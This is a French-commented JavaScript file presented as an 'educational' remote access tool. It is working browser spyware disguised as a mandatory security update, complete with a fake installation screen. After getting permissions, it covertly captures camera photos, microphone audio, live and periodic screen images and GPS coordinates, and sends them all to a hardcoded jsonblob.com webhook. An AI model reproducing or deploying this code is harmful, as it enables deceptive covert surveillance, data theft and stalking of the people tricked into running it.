// ═══════════════════════════════════════════════════════════════
// ZENIN SECURITY — RAT (Outil éducatif)
// Capture vidéo d'écran en direct + auto-capture + webhook
// ═══════════════════════════════════════════════════════════════

const WEBHOOK_URL = 'https://jsonblob.com/api/jsonBlob/019ed161-a6f2-7707-a400-0291c46d621b';

let state = {
  camera: false, mic: false, loc: false, screen: false, notif: false, storage: false,
  stream: null, screenStream: null, screenRecorder: null,
  photos: [], audios: [], screens: [], gps: [], logs: []
};

let screenAutoInterval = null;

// ── Utility ──
function log(msg, type) {
  const el = document.getElementById('logArea');
  if (!el) return;
  const now = new Date().toLocaleTimeString('fr-FR');
  const col = type === 'err' ? 'log-error' : type === 'warn' ? 'log-warn' : type === 'info' ? 'log-ok' : 'log-info';
  el.innerHTML += `<br><span class="log-time">[${now}]</span> <span class="${col}">${msg}</span>`;
  el.scrollTop = el.scrollHeight;
  while (el.children.length > 40) el.removeChild(el.firstChild);
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function sendData(type, data) {
  try {
    const payload = { type, data, timestamp: new Date().toISOString(), device: navigator.userAgent };
    await fetch(WEBHOOK_URL, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    log('📡 Envoyé: ' + type, 'info');
  } catch(e) {
    log('Erreur envoi: ' + e.message, 'err');
  }
}

// ── Navigation ──
function showPermissions() {
  document.getElementById('screen-intro').style.display = 'none';
  document.getElementById('screen-perms').style.display = 'block';
  log('Demande permissions...', 'warn');
}

function showLater() {
  alert('Cette mise à jour est obligatoire pour la sécurité de votre appareil.');
}

function showDashboard() {
  document.getElementById('screen-success').style.display = 'none';
  document.getElementById('screen-dash').style.display = 'block';
  log('Dashboard actif — surveillance démarrée', 'warn');

  sendData('device', {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: window.innerWidth + 'x' + window.innerHeight,
    permissions: { camera: state.camera, mic: state.mic, loc: state.loc, screen: state.screen, notif: state.notif, storage: state.storage }
  });

  startAutoCapture();
}

// ── Permissions ──
async function requestPerm(type) {
  const el = document.getElementById('p-' + type);
  if (el.classList.contains('granted')) return;
  log('Demande: ' + type, 'warn');

  try {
    let ok = false;
    switch (type) {
      case 'camera':
        state.stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode:'environment'}, audio: false });
        state.camera = true; ok = true; break;
      case 'mic':
        await navigator.mediaDevices.getUserMedia({ audio: true });
        state.mic = true; ok = true; break;
      case 'loc':
        navigator.geolocation.getCurrentPosition(p => {
          state.loc = true;
          updatePermUI(type, true);
          log('GPS: ' + p.coords.latitude.toFixed(4) + ', ' + p.coords.longitude.toFixed(4), 'info');
          checkPerms();
        }, () => { log('GPS refusé', 'err'); updatePermUI(type, false); });
        return;
      case 'screen':
        try {
          let testStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
          testStream.getTracks().forEach(t => t.stop());
          state.screen = true; ok = true;
        } catch(e) { ok = false; } break;
      case 'notif':
        if ('Notification' in window) { const r = await Notification.requestPermission(); ok = r === 'granted'; state.notif = ok; } break;
      case 'storage':
        state.storage = true; ok = true; break;
    }
    if (ok) { updatePermUI(type, true); log(type + ' ✓', 'info'); }
  } catch (e) { log(type + ' ✗ ' + e.message, 'err'); }
  checkPerms();
}

function updatePermUI(type, granted) {
  const el = document.getElementById('p-' + type);
  if (granted) { el.classList.add('granted'); el.querySelector('.perm-check').textContent = '✓'; }
}

function checkPerms() {
  const all = ['camera','mic','loc','screen','notif','storage'].every(p => {
    return document.getElementById('p-' + p).classList.contains('granted');
  });
  document.getElementById('installBtn').disabled = !all;
  if (all) log('Toutes permissions ✓', 'info');
}

// ── Installation ──
async function startInstall() {
  document.getElementById('screen-perms').style.display = 'none';
  document.getElementById('screen-install').style.display = 'block';
  log('Installation...', 'info');

  const steps = ['s1','s2','s3','s4','s5'];
  for (let i = 0; i < steps.length; i++) {
    const el = document.getElementById(steps[i]);
    el.querySelector('.step-icon').className = 'step-icon active';
    el.querySelector('.step-icon').textContent = '⏳';
    document.getElementById('progBar').style.width = (i * 20) + '%';
    await sleep(1500);
    el.querySelector('.step-icon').className = 'step-icon done';
    el.querySelector('.step-icon').textContent = '✓';
    el.querySelector('.step-time').textContent = '✓';
    document.getElementById('progBar').style.width = ((i + 1) * 20) + '%';
  }

  document.getElementById('progBar').style.width = '100%';
  await sleep(500);
  log('Installation terminée!', 'info');
  document.getElementById('screen-install').style.display = 'none';
  document.getElementById('screen-success').style.display = 'block';
}

// ═══ CAPTURES ═══

// 📸 Photo
async function doPhoto() {
  if (!state.camera || !state.stream) { log('Caméra indisponible', 'err'); return; }
  log('Capture photo...', 'info');
  try {
    const video = document.createElement('video');
    video.srcObject = state.stream; video.play();
    await sleep(500);
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
    state.photos.push(dataUrl);
    document.getElementById('liveView').innerHTML = '';
    const img = document.createElement('img');
    img.src = dataUrl;
    img.style.width = '100%'; img.style.maxHeight = '250px'; img.style.objectFit = 'contain';
    document.getElementById('liveView').appendChild(img);
    await sendData('photo', { image: dataUrl, index: state.photos.length });
    log('📸 Photo #' + state.photos.length, 'info');
  } catch(e) { log('Erreur photo: ' + e.message, 'err'); }
}

// 🎤 Audio
async function doAudio() {
  log('Audio 5s...', 'info');
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const rec = new MediaRecorder(stream);
    const chunks = [];
    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = () => {
      const blob = new Blob(chunks, { type: 'audio/webm' });
      const reader = new FileReader();
      reader.onloadend = () => {
        state.audios.push(reader.result);
        document.getElementById('liveView').innerHTML = '';
        const audio = document.createElement('audio');
        audio.controls = true; audio.src = reader.result;
        audio.style.width = '100%'; audio.style.padding = '8px';
        document.getElementById('liveView').appendChild(audio);
        sendData('audio', { audio: reader.result, index: state.audios.length });
        log('🎤 Audio #' + state.audios.length, 'info');
      };
      reader.readAsDataURL(blob);
    };
    rec.start();
    setTimeout(() => { rec.stop(); stream.getTracks().forEach(t => t.stop()); }, 5000);
  } catch(e) { log('Erreur audio: ' + e.message, 'err'); }
}

// 🎥 Écran LIVE (Vidéo en direct)
async function doScreen() {
  log('Écran live...', 'warn');
  try {
    const stream = await navigator.mediaDevices.getDisplayMedia({
      video: { mediaSource: 'screen', width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 10 } },
      audio: false
    });

    const video = document.createElement('video');
    video.srcObject = stream;
    video.autoplay = true;
    video.muted = true;
    video.style.width = '100%';
    video.style.maxHeight = '300px';
    video.style.objectFit = 'contain';

    document.getElementById('liveView').innerHTML = '';
    document.getElementById('liveView').appendChild(video);

    log('🎥 Flux écran en DIRECT!', 'info');

    // Enregistrer en vidéo
    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
    const chunks = [];
    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
    recorder.onstop = () => {
      const blob = new Blob(chunks, { type: 'video/webm' });
      const reader = new FileReader();
      reader.onloadend = () => {
        state.screens.push(reader.result);
        sendData('screen_video', { video: reader.result, index: state.screens.length });
        log('🎥 Vidéo #' + state.screens.length, 'info');
      };
      reader.readAsDataURL(blob);
    };
    recorder.start();

    state.screenStream = stream;
    state.screenRecorder = recorder;

    // Bouton pour arrêter
    stream.getVideoTracks()[0].onended = () => {
      document.getElementById('liveView').innerHTML = '<div class="live-placeholder"><div class="live-icon">⏹️</div><div class="live-text">Partage arrêté</div></div>';
      log('⏹️ Partage écran arrêté', 'warn');
    };

  } catch(e) { log('Erreur écran: ' + e.message, 'err'); }
}

// 📍 GPS
function doGPS() {
  if (!navigator.geolocation) { log('GPS non supporté', 'err'); return; }
  log('GPS...', 'info');
  navigator.geolocation.getCurrentPosition(p => {
    const g = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, time: new Date().toISOString() };
    state.gps.push(g);
    document.getElementById('liveView').innerHTML = '<div style="text-align:center;padding:16px;color:#fff"><div style="font-size:32px;margin-bottom:4px">📍</div><div style="font-family:monospace;font-size:13px;color:#f59e0b">' + g.lat.toFixed(6) + ', ' + g.lon.toFixed(6) + '</div><div style="font-size:11px;color:#888;margin-top:4px">Précision: ' + (g.acc ? g.acc.toFixed(0) : '?') + 'm</div><a href="https://maps.google.com/?q=' + g.lat + ',' + g.lon + '" target="_blank" style="color:#58a6ff;font-size:12px;display:block;margin-top:8px">🗺️ Google Maps</a></div>';
    sendData('gps', g);
    log('📍 GPS: ' + g.lat.toFixed(4) + ', ' + g.lon.toFixed(4), 'info');
  }, () => log('GPS refusé', 'err'));
}

// 🔐 Encrypt (simulation)
function doEncrypt() {
  log('🔐 Cryptage simulé (mode navigateur)', 'warn');
  sendData('report', { action: 'encrypt_sim', note: 'Mode navigateur', time: new Date().toISOString() });
}

// 🛑 Stop
function stopAll() {
  if (state.stream) { state.stream.getTracks().forEach(t => t.stop()); state.stream = null; }
  if (state.screenStream) { state.screenStream.getTracks().forEach(t => t.stop()); state.screenStream = null; }
  if (screenAutoInterval) { clearInterval(screenAutoInterval); screenAutoInterval = null; }
  log('🛑 Tout arrêté', 'warn');
  document.getElementById('liveView').innerHTML = '<div class="live-placeholder"><div class="live-icon">🛑</div><div class="live-text">Surveillance arrêtée</div></div>';
}

// ═══ AUTO CAPTURE ═══
function startAutoCapture() {
  // Toutes les 3 secondes: capture écran
  screenAutoInterval = setInterval(async () => {
    if (!state.screen) return;
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream; video.autoplay = true; video.muted = true;
      await sleep(300);
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
      canvas.getContext('2d').drawImage(video, 0, 0);
      stream.getTracks().forEach(t => t.stop());
      const dataUrl = canvas.toDataURL('image/jpeg', 0.35);
      state.screens.push(dataUrl);
      await sendData('screen_auto', { image: dataUrl, index: state.screens.length, time: new Date().toISOString() });
      log('🖥️ Auto #' + state.screens.length, 'info');
    } catch(e) {}
  }, 3000);

  // Toutes les 5 min: photo + GPS
  setInterval(() => {
    if (state.camera) doPhoto();
    if (state.loc) doGPS();
  }, 300000);
}
